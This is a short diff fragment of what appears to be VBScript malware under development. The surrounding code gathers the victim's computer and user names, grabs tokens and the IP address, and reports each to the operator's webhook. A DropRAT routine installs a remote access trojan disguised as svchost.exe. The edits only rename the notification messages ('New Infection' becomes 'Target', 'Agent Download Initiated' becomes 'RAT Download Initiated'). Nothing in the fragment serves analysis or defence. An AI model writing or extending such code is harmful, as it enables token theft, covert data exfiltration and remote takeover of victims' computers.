@@ -19,7 +19,7 @@ PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
 ' --- 1. INITIAL GRABS ---
-Call PostEmbedTo(":satellite: New Infection", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
+Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 
@@ -58,7 +58,7 @@ Sub DropRAT(targetWH, sendRocket)
     Dim op : op = tPath & "\svchost.exe"
     
     If sendRocket Then
-        Call PostEmbedTo(":rocket: Agent Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
+        Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
     End If
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
